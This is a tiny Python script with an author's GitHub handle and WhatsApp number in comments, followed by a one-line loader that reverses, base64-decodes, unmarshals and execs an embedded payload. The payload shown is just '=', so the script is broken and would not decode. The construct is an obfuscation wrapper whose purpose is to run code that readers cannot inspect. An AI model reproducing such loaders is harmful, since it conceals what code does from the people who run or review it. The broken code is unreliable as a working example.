#Github : github.com/ChangFB
#WhatsApp : 0822-6131-0817
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))